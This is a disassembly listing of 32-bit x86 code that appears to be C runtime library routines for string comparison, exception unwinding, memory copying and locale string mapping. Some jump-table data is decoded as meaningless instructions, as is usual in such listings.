  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
  428378:	mov    ecx,DWORD PTR [ebp+0x10]
  42837b:	mov    edi,DWORD PTR [ebp+0x8]
  42837e:	mov    eax,ecx
  428380:	mov    edx,ecx
  428382:	add    eax,esi
  428384:	cmp    edi,esi
  428386:	jbe    0x428390
  428388:	cmp    edi,eax
  42838a:	jb     0x42850c
  428390:	test   edi,0x3
  428396:	jne    0x4283ac
  428398:	shr    ecx,0x2
  42839b:	and    edx,0x3
  42839e:	cmp    ecx,0x8
  4283a1:	jb     0x4283cc
  4283a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	jmp    DWORD PTR [edx*4+0x4284bc]
  4283ac:	mov    eax,edi
  4283ae:	mov    edx,0x3
  4283b3:	sub    ecx,0x4
  4283b6:	jb     0x4283c4
  4283b8:	and    eax,0x3
  4283bb:	add    ecx,eax
  4283bd:	jmp    DWORD PTR [eax*4+0x4283d0]
  4283c4:	jmp    DWORD PTR [ecx*4+0x4284cc]
  4283cb:	nop
  4283cc:	jmp    DWORD PTR [ecx*4+0x428450]
  4283d3:	nop
  4283d4:	loopne 0x428359
  4283d6:	inc    edx
  4283d7:	add    BYTE PTR [esp+eax*4],cl
  4283da:	inc    edx
  4283db:	add    BYTE PTR [eax],dh
  4283dd:	test   BYTE PTR [edx+0x0],al
  4283e0:	and    edx,ecx
  4283e2:	mov    al,BYTE PTR [esi]
  4283e4:	mov    BYTE PTR [edi],al
  4283e6:	mov    al,BYTE PTR [esi+0x1]
  4283e9:	mov    BYTE PTR [edi+0x1],al
  4283ec:	mov    al,BYTE PTR [esi+0x2]
  4283ef:	shr    ecx,0x2
  4283f2:	mov    BYTE PTR [edi+0x2],al
  4283f5:	add    esi,0x3
  4283f8:	add    edi,0x3
  4283fb:	cmp    ecx,0x8
  4283fe:	jb     0x4283cc
  428400:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428402:	jmp    DWORD PTR [edx*4+0x4284bc]
  428409:	lea    ecx,[ecx+0x0]
  42840c:	and    edx,ecx
  42840e:	mov    al,BYTE PTR [esi]
  428410:	mov    BYTE PTR [edi],al
  428412:	mov    al,BYTE PTR [esi+0x1]
  428415:	shr    ecx,0x2
  428418:	mov    BYTE PTR [edi+0x1],al
  42841b:	add    esi,0x2
  42841e:	add    edi,0x2
  428421:	cmp    ecx,0x8
  428424:	jb     0x4283cc
  428426:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428428:	jmp    DWORD PTR [edx*4+0x4284bc]
  42842f:	nop
  428430:	and    edx,ecx
  428432:	mov    al,BYTE PTR [esi]
  428434:	mov    BYTE PTR [edi],al
  428436:	add    esi,0x1
  428439:	shr    ecx,0x2
  42843c:	add    edi,0x1
  42843f:	cmp    ecx,0x8
  428442:	jb     0x4283cc
  428444:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428446:	jmp    DWORD PTR [edx*4+0x4284bc]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    bl,0x84
  428452:	inc    edx
  428453:	add    BYTE PTR [eax-0x67ffbd7c],ah
  428459:	test   BYTE PTR [edx+0x0],al
  42845c:	nop
  42845d:	test   BYTE PTR [edx+0x0],al
  428460:	mov    BYTE PTR [edx+eax*2+0x42848000],al
  428467:	add    BYTE PTR [eax-0x7c],bh
  42846a:	inc    edx
  42846b:	add    BYTE PTR [eax-0x7c],dh
  42846e:	inc    edx
  42846f:	add    BYTE PTR [ebx-0x761b71bc],cl
  428475:	inc    esp
  428476:	(bad)  
  428477:	in     al,0x8b
  428479:	inc    esp
  42847a:	mov    gs,eax
  42847c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428480:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428484:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428488:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42848c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  428490:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  428494:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  428498:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42849c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4284a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4284a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4284a8:	lea    eax,[ecx*4+0x0]
  4284af:	add    esi,eax
  4284b1:	add    edi,eax
  4284b3:	jmp    DWORD PTR [edx*4+0x4284bc]
  4284ba:	mov    edi,edi
  4284bc:	int3   
  4284bd:	test   BYTE PTR [edx+0x0],al
  4284c0:	aam    0x84
  4284c2:	inc    edx
  4284c3:	add    al,ah
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	hlt    
  4284c9:	test   BYTE PTR [edx+0x0],al
  4284cc:	mov    eax,DWORD PTR [ebp+0x8]
  4284cf:	pop    esi
  4284d0:	pop    edi
  4284d1:	leave  
  4284d2:	ret    
  4284d3:	nop
  4284d4:	mov    al,BYTE PTR [esi]
  4284d6:	mov    BYTE PTR [edi],al
  4284d8:	mov    eax,DWORD PTR [ebp+0x8]
  4284db:	pop    esi
  4284dc:	pop    edi
  4284dd:	leave  
  4284de:	ret    
  4284df:	nop
  4284e0:	mov    al,BYTE PTR [esi]
  4284e2:	mov    BYTE PTR [edi],al
  4284e4:	mov    al,BYTE PTR [esi+0x1]
  4284e7:	mov    BYTE PTR [edi+0x1],al
  4284ea:	mov    eax,DWORD PTR [ebp+0x8]
  4284ed:	pop    esi
  4284ee:	pop    edi
  4284ef:	leave  
  4284f0:	ret    
  4284f1:	lea    ecx,[ecx+0x0]
  4284f4:	mov    al,BYTE PTR [esi]
  4284f6:	mov    BYTE PTR [edi],al
  4284f8:	mov    al,BYTE PTR [esi+0x1]
  4284fb:	mov    BYTE PTR [edi+0x1],al
  4284fe:	mov    al,BYTE PTR [esi+0x2]
  428501:	mov    BYTE PTR [edi+0x2],al
  428504:	mov    eax,DWORD PTR [ebp+0x8]
  428507:	pop    esi
  428508:	pop    edi
  428509:	leave  
  42850a:	ret    
  42850b:	nop
  42850c:	lea    esi,[ecx+esi*1-0x4]
  428510:	lea    edi,[ecx+edi*1-0x4]
  428514:	test   edi,0x3
  42851a:	jne    0x428540
  42851c:	shr    ecx,0x2
  42851f:	and    edx,0x3
  428522:	cmp    ecx,0x8
  428525:	jb     0x428534
  428527:	std    
  428528:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852a:	cld    
  42852b:	jmp    DWORD PTR [edx*4+0x428658]
  428532:	mov    edi,edi
  428534:	neg    ecx
  428536:	jmp    DWORD PTR [ecx*4+0x428608]
  42853d:	lea    ecx,[ecx+0x0]
  428540:	mov    eax,edi
  428542:	mov    edx,0x3
  428547:	cmp    ecx,0x4
  42854a:	jb     0x428558
  42854c:	and    eax,0x3
  42854f:	sub    ecx,eax
  428551:	jmp    DWORD PTR [eax*4+0x42855c]
  428558:	jmp    DWORD PTR [ecx*4+0x428658]
  42855f:	nop
  428560:	ins    BYTE PTR es:[edi],dx
  428561:	test   DWORD PTR [edx+0x0],eax
  428564:	nop
  428565:	test   DWORD PTR [edx+0x0],eax
  428568:	mov    eax,0x8a004285
  42856d:	inc    esi
  42856e:	add    esp,DWORD PTR [ebx]
  428570:	ror    DWORD PTR [eax-0x117cfcb9],1
  428576:	add    ecx,eax
  428578:	jmp    0x232087f
  42857d:	cmp    ecx,0x8
  428580:	jb     0x428534
  428582:	std    
  428583:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428585:	cld    
  428586:	jmp    DWORD PTR [edx*4+0x428658]
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	and    edx,ecx
  428595:	mov    BYTE PTR [edi+0x3],al
  428598:	mov    al,BYTE PTR [esi+0x2]
  42859b:	shr    ecx,0x2
  42859e:	mov    BYTE PTR [edi+0x2],al
  4285a1:	sub    esi,0x2
  4285a4:	sub    edi,0x2
  4285a7:	cmp    ecx,0x8
  4285aa:	jb     0x428534
  4285ac:	std    
  4285ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285af:	cld    
  4285b0:	jmp    DWORD PTR [edx*4+0x428658]
  4285b7:	nop
  4285b8:	mov    al,BYTE PTR [esi+0x3]
  4285bb:	and    edx,ecx
  4285bd:	mov    BYTE PTR [edi+0x3],al
  4285c0:	mov    al,BYTE PTR [esi+0x2]
  4285c3:	mov    BYTE PTR [edi+0x2],al
  4285c6:	mov    al,BYTE PTR [esi+0x1]
  4285c9:	shr    ecx,0x2
  4285cc:	mov    BYTE PTR [edi+0x1],al
  4285cf:	sub    esi,0x3
  4285d2:	sub    edi,0x3
  4285d5:	cmp    ecx,0x8
  4285d8:	jb     0x428534
  4285de:	std    
  4285df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285e1:	cld    
  4285e2:	jmp    DWORD PTR [edx*4+0x428658]
  4285e9:	lea    ecx,[ecx+0x0]
  4285ec:	or     al,0x86
  4285ee:	inc    edx
  4285ef:	add    BYTE PTR [esi+eax*4],dl
  4285f2:	inc    edx
  4285f3:	add    BYTE PTR [esi+eax*4],bl
  4285f6:	inc    edx
  4285f7:	add    BYTE PTR [esi+eax*4],ah
  4285fa:	inc    edx
  4285fb:	add    BYTE PTR [esi+eax*4],ch
  4285fe:	inc    edx
  4285ff:	add    BYTE PTR [esi+eax*4],dh
  428602:	inc    edx
  428603:	add    BYTE PTR [esi+eax*4],bh
  428606:	inc    edx
  428607:	add    BYTE PTR [edi-0x7a],cl
  42860a:	inc    edx
  42860b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428611:	inc    esp
  428612:	(bad)  
  428613:	sbb    al,0x8b
  428615:	inc    esp
  428616:	mov    ds,WORD PTR [eax]
  428618:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42861c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428620:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428624:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428628:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42862c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428630:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428634:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428638:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42863c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428640:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428644:	lea    eax,[ecx*4+0x0]
  42864b:	add    esi,eax
  42864d:	add    edi,eax
  42864f:	jmp    DWORD PTR [edx*4+0x428658]
  428656:	mov    edi,edi
  428658:	push   0x70004286
  42865d:	xchg   BYTE PTR [edx+0x0],al
  428660:	add    BYTE PTR [esi-0x796bffbe],0x42
  428667:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42866d:	leave  
  42866e:	ret    
  42866f:	nop
  428670:	mov    al,BYTE PTR [esi+0x3]
  428673:	mov    BYTE PTR [edi+0x3],al
  428676:	mov    eax,DWORD PTR [ebp+0x8]
  428679:	pop    esi
  42867a:	pop    edi
  42867b:	leave  
  42867c:	ret    
  42867d:	lea    ecx,[ecx+0x0]
  428680:	mov    al,BYTE PTR [esi+0x3]
  428683:	mov    BYTE PTR [edi+0x3],al
  428686:	mov    al,BYTE PTR [esi+0x2]
  428689:	mov    BYTE PTR [edi+0x2],al
  42868c:	mov    eax,DWORD PTR [ebp+0x8]
  42868f:	pop    esi
  428690:	pop    edi
  428691:	leave  
  428692:	ret    
  428693:	nop
  428694:	mov    al,BYTE PTR [esi+0x3]
  428697:	mov    BYTE PTR [edi+0x3],al
  42869a:	mov    al,BYTE PTR [esi+0x2]
  42869d:	mov    BYTE PTR [edi+0x2],al
  4286a0:	mov    al,BYTE PTR [esi+0x1]
  4286a3:	mov    BYTE PTR [edi+0x1],al
  4286a6:	mov    eax,DWORD PTR [ebp+0x8]
  4286a9:	pop    esi
  4286aa:	pop    edi
  4286ab:	leave  
  4286ac:	ret    
  4286ad:	push   ebp
  4286ae:	mov    ebp,esp
  4286b0:	sub    esp,0xc
  4286b3:	mov    eax,ds:0x462f30
  4286b8:	xor    eax,DWORD PTR [ebp+0x4]
  4286bb:	and    BYTE PTR [ebp-0x6],0x0
  4286bf:	push   0x6
  4286c1:	mov    DWORD PTR [ebp-0x4],eax
  4286c4:	lea    eax,[ebp-0xc]
  4286c7:	push   eax
  4286c8:	push   0x1004
  4286cd:	push   DWORD PTR [ebp+0x8]
  4286d0:	call   DWORD PTR ds:0x429138
  4286d6:	test   eax,eax
  4286d8:	jne    0x4286df
  4286da:	or     eax,0xffffffff
  4286dd:	jmp    0x4286e9
  4286df:	lea    eax,[ebp-0xc]
  4286e2:	push   eax
  4286e3:	call   0x4289ee
  4286e8:	pop    ecx
  4286e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4286ec:	xor    ecx,DWORD PTR [ebp+0x4]
  4286ef:	call   0x425afc
  4286f4:	leave  
  4286f5:	ret    
  4286f6:	push   0x38
  4286f8:	push   0x42a000
  4286fd:	call   0x425434
  428702:	mov    eax,ds:0x462f30
  428707:	xor    eax,DWORD PTR [ebp+0x4]
  42870a:	mov    DWORD PTR [ebp-0x1c],eax
  42870d:	xor    edi,edi
  42870f:	mov    DWORD PTR [ebp-0x20],edi
  428712:	mov    DWORD PTR [ebp-0x24],edi
  428715:	mov    eax,DWORD PTR [ebp+0x14]
  428718:	mov    ebx,DWORD PTR [eax]
  42871a:	mov    DWORD PTR [ebp-0x28],ebx
  42871d:	mov    DWORD PTR [ebp-0x2c],edi
  428720:	mov    eax,DWORD PTR [ebp+0x8]
  428723:	cmp    eax,DWORD PTR [ebp+0xc]
  428726:	je     0x42889f
  42872c:	lea    ecx,[ebp-0x40]
  42872f:	push   ecx
  428730:	push   eax
  428731:	mov    esi,DWORD PTR ds:0x429104
  428737:	call   esi
  428739:	test   eax,eax
  42873b:	je     0x42875d
  42873d:	cmp    DWORD PTR [ebp-0x40],0x1
  428741:	jne    0x42875d
  428743:	lea    eax,[ebp-0x40]
  428746:	push   eax
  428747:	push   DWORD PTR [ebp+0xc]
  42874a:	call   esi
  42874c:	test   eax,eax
  42874e:	je     0x42875d
  428750:	cmp    DWORD PTR [ebp-0x40],0x1
  428754:	jne    0x42875d
  428756:	mov    DWORD PTR [ebp-0x2c],0x1
  42875d:	cmp    DWORD PTR [ebp-0x2c],edi
  428760:	je     0x42877c
  428762:	cmp    ebx,0xffffffff
  428765:	je     0x42876b
  428767:	mov    esi,ebx
  428769:	jmp    0x428777
  42876b:	push   DWORD PTR [ebp+0x10]
  42876e:	call   0x425a40
  428773:	pop    ecx
  428774:	mov    esi,eax
  428776:	inc    esi
  428777:	mov    DWORD PTR [ebp-0x44],esi
  42877a:	jmp    0x42877f
  42877c:	mov    esi,DWORD PTR [ebp-0x44]
  42877f:	cmp    DWORD PTR [ebp-0x2c],edi
  428782:	jne    0x42879e
  428784:	push   edi
  428785:	push   edi
  428786:	push   ebx
  428787:	push   DWORD PTR [ebp+0x10]
  42878a:	push   0x1
  42878c:	push   DWORD PTR [ebp+0x8]
  42878f:	call   DWORD PTR ds:0x429128
  428795:	mov    esi,eax
  428797:	mov    DWORD PTR [ebp-0x44],esi
  42879a:	cmp    esi,edi
  42879c:	je     0x4287f6
  42879e:	mov    DWORD PTR [ebp-0x4],edi
  4287a1:	lea    eax,[esi+esi*1]
  4287a4:	add    eax,0x3
  4287a7:	and    eax,0xfffffffc
  4287aa:	call   0x425480
  4287af:	mov    DWORD PTR [ebp-0x18],esp
  4287b2:	mov    ebx,esp
  4287b4:	mov    DWORD PTR [ebp-0x48],ebx
  4287b7:	lea    eax,[esi+esi*1]
  4287ba:	push   eax
  4287bb:	push   edi
  4287bc:	push   ebx
  4287bd:	call   0x427d30
  4287c2:	add    esp,0xc
  4287c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287c9:	jmp    0x4287e2
  4287cb:	xor    eax,eax
  4287cd:	inc    eax
  4287ce:	ret    
  4287cf:	mov    esp,DWORD PTR [ebp-0x18]
  4287d2:	call   0x4288c5
  4287d7:	xor    edi,edi
  4287d9:	xor    ebx,ebx
  4287db:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287df:	mov    esi,DWORD PTR [ebp-0x44]
  4287e2:	cmp    ebx,edi
  4287e4:	jne    0x428804
  4287e6:	push   esi
  4287e7:	push   0x2
  4287e9:	call   0x426548
  4287ee:	pop    ecx
  4287ef:	pop    ecx
  4287f0:	mov    ebx,eax
  4287f2:	cmp    ebx,edi
  4287f4:	jne    0x4287fd
  4287f6:	xor    eax,eax
  4287f8:	jmp    0x4288b1
  4287fd:	mov    DWORD PTR [ebp-0x24],0x1
  428804:	push   esi
  428805:	push   ebx
  428806:	push   DWORD PTR [ebp-0x28]
  428809:	push   DWORD PTR [ebp+0x10]
  42880c:	push   0x1
  42880e:	push   DWORD PTR [ebp+0x8]
  428811:	call   DWORD PTR ds:0x429128
  428817:	test   eax,eax
  428819:	je     0x4288a2
  42881f:	cmp    DWORD PTR [ebp+0x18],edi
  428822:	je     0x428844
  428824:	push   edi
  428825:	push   edi
  428826:	push   DWORD PTR [ebp+0x1c]
  428829:	push   DWORD PTR [ebp+0x18]
  42882c:	push   esi
  42882d:	push   ebx
  42882e:	push   edi
  42882f:	push   DWORD PTR [ebp+0xc]
  428832:	call   DWORD PTR ds:0x4290bc
  428838:	test   eax,eax
  42883a:	je     0x4288a2
  42883c:	mov    eax,DWORD PTR [ebp+0x18]
  42883f:	mov    DWORD PTR [ebp-0x20],eax
  428842:	jmp    0x4288a2
  428844:	cmp    DWORD PTR [ebp-0x2c],edi
  428847:	jne    0x42885f
  428849:	push   edi
  42884a:	push   edi
  42884b:	push   edi
  42884c:	push   edi
  42884d:	push   esi
  42884e:	push   ebx
  42884f:	push   edi
  428850:	push   DWORD PTR [ebp+0xc]
  428853:	call   DWORD PTR ds:0x4290bc
  428859:	mov    esi,eax
  42885b:	cmp    esi,edi
  42885d:	je     0x4288a2
  42885f:	push   esi
  428860:	push   0x1
  428862:	call   0x426548
  428867:	pop    ecx
  428868:	pop    ecx
  428869:	mov    DWORD PTR [ebp-0x20],eax
  42886c:	cmp    eax,edi
  42886e:	je     0x4288a2
  428870:	push   edi
  428871:	push   edi
  428872:	push   esi
  428873:	push   eax
  428874:	push   esi
  428875:	push   ebx
  428876:	push   edi
  428877:	push   DWORD PTR [ebp+0xc]
  42887a:	call   DWORD PTR ds:0x4290bc
  428880:	cmp    eax,edi
  428882:	jne    0x428892
  428884:	push   DWORD PTR [ebp-0x20]
  428887:	call   0x42603a
  42888c:	pop    ecx
  42888d:	mov    DWORD PTR [ebp-0x20],edi
  428890:	jmp    0x4288a2
  428892:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  428896:	je     0x4288a2
  428898:	mov    ecx,DWORD PTR [ebp+0x14]
  42889b:	mov    DWORD PTR [ecx],eax
  42889d:	jmp    0x4288a2
  42889f:	mov    ebx,DWORD PTR [ebp-0x48]
  4288a2:	cmp    DWORD PTR [ebp-0x24],edi
  4288a5:	je     0x4288ae
  4288a7:	push   ebx
  4288a8:	call   0x42603a
  4288ad:	pop    ecx
  4288ae:	mov    eax,DWORD PTR [ebp-0x20]
  4288b1:	lea    esp,[ebp-0x54]
  4288b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4288b7:	xor    ecx,DWORD PTR [ebp+0x4]
  4288ba:	call   0x425afc
  4288bf:	call   0x42546f
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x48
  4288cb:	push   ebx
  4288cc:	push   esi
  4288cd:	push   edi
  4288ce:	push   0x4
  4288d0:	pop    eax
  4288d1:	call   0x425480
  4288d6:	mov    ebx,esp
  4288d8:	push   0x1c
  4288da:	lea    eax,[ebp-0x24]
  4288dd:	push   eax
  4288de:	push   ebx
  4288df:	call   DWORD PTR ds:0x429054
  4288e5:	test   eax,eax
  4288e7:	je     0x42895a
  4288e9:	mov    edi,DWORD PTR [ebp-0x20]
  4288ec:	lea    eax,[ebp-0x48]
  4288ef:	push   eax
  4288f0:	call   DWORD PTR ds:0x42908c
  4288f6:	mov    eax,DWORD PTR [ebp-0x44]
  4288f9:	lea    esi,[eax-0x1]
  4288fc:	not    esi
  4288fe:	and    esi,ebx
  428900:	sub    esi,eax
  428902:	mov    DWORD PTR [ebp-0x4],eax
  428905:	mov    eax,ds:0x4635c4
  42890a:	mov    ecx,eax
  42890c:	dec    ecx
  42890d:	neg    ecx
  42890f:	sbb    ecx,ecx
  428911:	and    ecx,0xffff1000
  428917:	add    ecx,0x11000
  42891d:	add    ecx,edi
  42891f:	cmp    esi,ecx
  428921:	jb     0x42895a
  428923:	cmp    eax,0x1
  428926:	je     0x428972
  428928:	mov    ebx,edi
  42892a:	mov    edi,0x1000
  42892f:	push   0x1c
  428931:	lea    eax,[ebp-0x24]
  428934:	push   eax
  428935:	push   ebx
  428936:	call   DWORD PTR ds:0x429054
  42893c:	test   eax,eax
  42893e:	je     0x42895a
  428940:	add    ebx,DWORD PTR [ebp-0x18]
  428943:	test   DWORD PTR [ebp-0x14],edi
  428946:	je     0x42892f
  428948:	test   BYTE PTR [ebp-0xf],0x1
  42894c:	mov    ebx,DWORD PTR [ebp-0x24]
  42894f:	je     0x428956
  428951:	xor    eax,eax
  428953:	inc    eax
  428954:	jmp    0x42898e
  428956:	cmp    esi,ebx
  428958:	jae    0x42895e
  42895a:	xor    eax,eax
  42895c:	jmp    0x42898e
  42895e:	push   0x4
  428960:	push   edi
  428961:	push   DWORD PTR [ebp-0x4]
  428964:	push   ebx
  428965:	call   DWORD PTR ds:0x429058
  42896b:	mov    eax,ds:0x4635c4
  428970:	jmp    0x428974
  428972:	mov    ebx,esi
  428974:	dec    eax
  428975:	neg    eax
  428977:	sbb    eax,eax
  428979:	and    eax,0x103
  42897e:	lea    ecx,[ebp-0x8]
  428981:	push   ecx
  428982:	inc    eax
  428983:	push   eax
  428984:	push   DWORD PTR [ebp-0x4]
  428987:	push   ebx
  428988:	call   DWORD PTR ds:0x42906c
  42898e:	lea    esp,[ebp-0x54]
  428991:	pop    edi
  428992:	pop    esi
  428993:	pop    ebx
  428994:	leave  
  428995:	ret    
  428996:	int3   
  428997:	int3   
  428998:	int3   
  428999:	int3   
  42899a:	int3   
  42899b:	int3   
  42899c:	int3   
  42899d:	int3   
  42899e:	int3   
  42899f:	int3   
  4289a0:	push   ebp
  4289a1:	mov    ebp,esp
  4289a3:	push   edi
  4289a4:	push   esi
  4289a5:	push   ebx
  4289a6:	mov    esi,DWORD PTR [ebp+0xc]
  4289a9:	mov    edi,DWORD PTR [ebp+0x8]
  4289ac:	mov    al,0xff
  4289ae:	mov    edi,edi
  4289b0:	or     al,al
  4289b2:	je     0x4289e6
  4289b4:	mov    al,BYTE PTR [esi]
  4289b6:	add    esi,0x1
  4289b9:	mov    ah,BYTE PTR [edi]
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,al
  4289c0:	je     0x4289b0
  4289c2:	sub    al,0x41
  4289c4:	cmp    al,0x1a
  4289c6:	sbb    cl,cl
  4289c8:	and    cl,0x20
  4289cb:	add    al,cl
  4289cd:	add    al,0x41
  4289cf:	xchg   al,ah
  4289d1:	sub    al,0x41
  4289d3:	cmp    al,0x1a
  4289d5:	sbb    cl,cl
  4289d7:	and    cl,0x20
  4289da:	add    al,cl
  4289dc:	add    al,0x41
  4289de:	cmp    al,ah
  4289e0:	je     0x4289b0
  4289e2:	sbb    al,al
  4289e4:	sbb    al,0xff
  4289e6:	movsx  eax,al
  4289e9:	pop    ebx
  4289ea:	pop    esi
  4289eb:	pop    edi
  4289ec:	leave  
  4289ed:	ret    
  4289ee:	push   esi
  4289ef:	push   edi
  4289f0:	call   0x4252e9
  4289f5:	mov    edi,DWORD PTR [eax+0x64]
  4289f8:	cmp    edi,DWORD PTR ds:0x46308c
  4289fe:	je     0x428a07
  428a00:	call   0x42678f
  428a05:	mov    edi,eax
  428a07:	mov    esi,DWORD PTR [esp+0xc]
  428a0b:	cmp    DWORD PTR [edi+0x28],0x1
  428a0f:	movzx  eax,BYTE PTR [esi]
  428a12:	jle    0x428a22
  428a14:	push   0x8
  428a16:	push   eax
